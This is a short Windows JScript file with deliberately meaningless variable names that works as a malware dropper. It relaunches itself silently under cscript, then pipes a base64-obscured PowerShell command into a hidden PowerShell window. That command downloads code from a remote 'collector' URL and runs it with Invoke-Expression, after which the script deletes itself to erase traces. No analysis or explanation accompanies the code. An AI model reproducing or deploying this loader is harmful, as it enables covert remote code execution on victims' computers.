var q3m = WScript.CreateObject("WScript.Shell");
var d7k = WScript.CreateObject("Scripting.FileSystemObject");
var p0r = WScript.ScriptFullName;
if (WScript.FullName.toLowerCase().indexOf("wscript") !== -1) {
    var e5h = WScript.FullName.replace(/wscript/i, "cscript").replace(/syswow64/i, "system32");
    q3m.Run('"' + e5h + '" //nologo //E:JScript "' + p0r + '"', 0, false);
    WScript.Quit();
}
var y0t = String.fromCharCode(36) + "g85v=";
y0t += "'aHR0cHM6Ly9jb2xsZWN0b3IuaW52YWxpZC9hZ2VudA==';";
y0t += "$b=[System.Convert]::FromBase64String($g85v);";
y0t += "$u=[System.Text.Encoding]::UTF8.GetString($b);";
y0t += "$w=New-Object System.Net.WebClient;";
y0t += "$p=$w.DownloadData($u);";
y0t += "Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($p));";

var c9n = q3m.Exec("powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command -");
c9n.StdIn.Write(y0t + "\n");
c9n.StdIn.Close();
if (d7k.FileExists(p0r)) {
    d7k.DeleteFile(p0r, true);
}
